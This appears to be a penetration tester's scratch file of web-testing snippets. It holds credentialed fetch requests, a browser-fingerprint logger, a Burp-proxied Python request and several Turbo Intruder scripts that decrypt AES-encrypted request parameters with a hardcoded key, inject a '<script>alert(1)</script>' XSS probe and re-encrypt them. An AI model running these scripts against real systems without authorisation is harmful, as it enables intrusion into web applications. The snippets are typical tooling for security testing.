fetch('https://example.com/data', {
  method: 'GET',
  mode: 'cors',
  headers: {
    'Authorization': 'Bearer your_token_here',
    'Content-Type': 'application/json',
    'Custom-Header': 'your_value'
  }
})
  .then(response => response.json()) // Use response.text() if the response isn't JSON
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

fetch("https://target.com/api", {
  method: "GET",
  headers: {
    "Sec-Fetch-Site": "same-origin",  
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "User-Agent": navigator.userAgent
  },
  credentials: "include"
})
.then(response => response.text())
.then(console.log)
.catch(console.error);



console.log({
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  hardwareConcurrency: navigator.hardwareConcurrency,
  deviceMemory: navigator.deviceMemory,
  webglRenderer: (() => {
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return "Not Supported";
    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
  })()
});

import requests

# Burp Proxy Settings
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Custom Headers (Mimic Chrome Incognito)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Sec-CH-UA": "\"Google Chrome\";v=\"120\", \"Not A;Brand\";v=\"99\", \"Chromium\";v=\"120\"",
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": "\"Windows\"",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# Send the request through Burp
response = requests.get("https://target.com/api", headers=headers, proxies=proxies, verify=False)

# Print the response
print(response.text)



Turbo Intruder
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64, binascii

# AES CBC Decrypt
def decrypt_aes_cbc(hex_data, key_str, iv_str):
    key = key_str.encode('utf-8')
    iv = iv_str.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(binascii.unhexlify(hex_data)), AES.block_size)
    return decrypted

# AES CBC Encrypt
def encrypt_aes_cbc(plaintext_bytes, key_str, iv_str):
    key = key_str.encode('utf-8')
    iv = iv_str.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
    return binascii.hexlify(encrypted).decode()

# Turbo Intruder Entry Point
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False)

    # ---- MODIFY THESE VALUES ----
    key = 'your16byteutf8key'       # UTF-8 string
    iv = 'your16byteutf8ivv'        # UTF-8 string
    payload = '<script>alert(1)</script>'
    encrypted_hex = 'put_encrypted_hex_here'

    # Step 1: Decrypt
    decrypted = decrypt_aes_cbc(encrypted_hex, key, iv)
    print('Decrypted:', decrypted.decode(errors='ignore'))

    # Step 2: Modify
    modified = decrypted.decode(errors='ignore') + payload

    # Step 3: Re-encrypt
    new_encrypted_hex = encrypt_aes_cbc(modified.encode(), key, iv)
    print('Re-encrypted:', new_encrypted_hex)

    # Step 4: Send modified request
    base_request = '''POST /some-path HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

data={}'''.format(new_encrypted_hex)

    engine.queue(target.req, base_request)

def handleResponse(req, interesting):
    print(req.status, req.responseLength)



Turbo Intuder2
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import binascii
import re

def decrypt_aes_cbc(hex_data, key_str, iv_str):
    key = key_str.encode('utf-8')
    iv = iv_str.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(binascii.unhexlify(hex_data)), AES.block_size)
    return decrypted

def encrypt_aes_cbc(plaintext_bytes, key_str, iv_str):
    key = key_str.encode('utf-8')
    iv = iv_str.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
    return binascii.hexlify(encrypted).decode()

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False)

    key = '58945803628475210256298743257410'  # your key
    iv = '2578018473365974'                  # your iv

    # Get full original request
    original_request = target.req.toBytes().decode()

    # Extract encrypted hex from the URL
    match = re.search(r'GET\s+/[^\s]*\?([a-fA-F0-9]+)', original_request)
    if not match:
        print("Encrypted hex in URL not found")
        return

    encrypted_hex = match.group(1)
    decrypted = decrypt_aes_cbc(encrypted_hex, key, iv).decode(errors='ignore')
    print("[+] Decrypted string:", decrypted)

    # Parse decrypted query string
    params = decrypted.split('&')
    modified_params = []

    for param in params:
        if param.startswith('id='):
            key_val = param.split('=', 1)
            modified_value = key_val[1] + "<script>alert(1)</script>"
            modified_params.append(f"id={modified_value}")
        else:
            modified_params.append(param)

    modified_plaintext = '&'.join(modified_params)
    print("[+] Modified plaintext:", modified_plaintext)

    # Re-encrypt modified value
    re_encrypted_hex = encrypt_aes_cbc(modified_plaintext.encode(), key, iv)
    print("[+] Re-encrypted hex:", re_encrypted_hex)

    # Replace the original encrypted value in the request URL
    modified_request = original_request.replace(encrypted_hex, re_encrypted_hex)

    # Send the modified request
    engine.queue(target.req, modified_request.encode())

def handleResponse(req, interesting):
    print(f"Status: {req.status}, Length: {req.responseLength}")


Turbo Intruder 3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import binascii
import re

# Decrypt AES CBC
def decrypt_aes_cbc(hex_data, key_str, iv_str):
    key = key_str.encode('utf-8')
    iv = iv_str.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(binascii.unhexlify(hex_data)), AES.block_size)
    return decrypted

# Encrypt AES CBC
def encrypt_aes_cbc(plaintext_bytes, key_str, iv_str):
    key = key_str.encode('utf-8')
    iv = iv_str.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
    return binascii.hexlify(encrypted).decode()

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False)

    key = '58945803628475210256298743257410'  # replace with yours
    iv = '2578018473365974'                  # replace with yours

    original = target.req.toBytes().decode()
    
    # Extract encrypted value using regex (you can adjust this as needed)
    match = re.search(r'data=([a-fA-F0-9]+)', original)
    if not match:
        print("Encrypted data not found")
        return

    encrypted_hex = match.group(1)
    decrypted = decrypt_aes_cbc(encrypted_hex, key, iv).decode(errors='ignore')
    print('Decrypted:', decrypted)

    # Modify decrypted data
    modified = decrypted + '<script>alert(1)</script>'

    # Re-encrypt
    new_encrypted_hex = encrypt_aes_cbc(modified.encode(), key, iv)
    print('New encrypted:', new_encrypted_hex)

    # Replace original encrypted value in the request
    modified_request = original.replace(encrypted_hex, new_encrypted_hex)

    # Queue the modified request
    engine.queue(target.req, modified_request.encode())

def handleResponse(req, interesting):
    print(req.status, req.responseLength)



edit
from turbo_intruder import Request
from javax.crypto import Cipher
from javax.crypto.spec import SecretKeySpec, IvParameterSpec
from java.nio.charset import StandardCharsets
from jarray import array
import re

# AES helpers
def to_signed_java_byte_array(py_bytes):
    return array([(b if b < 128 else b - 256) for b in py_bytes], 'b')

def hex_to_bytes(hex_str):
    return bytes.fromhex(hex_str)

def bytes_to_hex(byte_arr):
    return ''.join(f'{(b + 256) % 256:02x}' for b in byte_arr)

def aes_decrypt(hex_data, key, iv):
    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    key_spec = SecretKeySpec(key.encode("utf-8"), "AES")
    iv_spec = IvParameterSpec(iv.encode("utf-8"))
    cipher.init(Cipher.DECRYPT_MODE, key_spec, iv_spec)
    decrypted = cipher.doFinal(to_signed_java_byte_array(hex_to_bytes(hex_data)))
    return decrypted.decode('utf-8', errors='ignore')

def aes_encrypt(plain_text, key, iv):
    cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
    key_spec = SecretKeySpec(key.encode("utf-8"), "AES")
    iv_spec = IvParameterSpec(iv.encode("utf-8"))
    cipher.init(Cipher.ENCRYPT_MODE, key_spec, iv_spec)
    encrypted = cipher.doFinal(to_signed_java_byte_array(plain_text.encode("utf-8")))
    return bytes_to_hex(encrypted)

# Your key and IV
key = "58945803628475210256298743257410"[0:16]
iv = "2578018473365974"

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False)

    for request in wordlists:
        engine.queue(request)

def handleResponse(req, interesting):
    original = req.toString()
    
    # Match both GET and POST requests with encrypted hex after '?'
    match = re.search(r'(GET|POST)\s+[^\s]*\?([a-fA-F0-9]+)', original)
    if not match:
        print("No encrypted value found")
        return

    encrypted_hex = match.group(2)
    print(f"[+] Encrypted data: {encrypted_hex}")

    try:
        decrypted = aes_decrypt(encrypted_hex, key, iv)
        print(f"[+] Decrypted data: {decrypted}")
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        return

    # Modify the id param
    parts = decrypted.split('&')
    new_parts = []
    for part in parts:
        if part.startswith("id="):
            new_parts.append("id=<script>alert(1)</script>")
        else:
            new_parts.append(part)
    modified_data = '&'.join(new_parts)
    print(f"[+] Modified data: {modified_data}")

    try:
        re_encrypted = aes_encrypt(modified_data, key, iv)
        print(f"[+] Re-encrypted hex: {re_encrypted}")
    except Exception as e:
        print(f"[!] Encryption error: {e}")
        return

    # Replace the encrypted string in the request
    new_request = original.replace(encrypted_hex, re_encrypted)
    req.setRaw(new_request)


Hex websocket------------------
function hexToUint8Array(hex) {
    if (hex.length % 2 !== 0) {
        throw new Error("Invalid hex string");
    }
    const array = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
        array[i / 2] = parseInt(hex.substr(i, 2), 16);
    }
    return array;
}
const socket = new WebSocket("ws://example.com/socket");

socket.addEventListener("open", () => {
    const hexData = "48656c6c6f"; // "Hello" in hex
    const binaryData = hexToUint8Array(hexData);
    socket.send(binaryData);
});
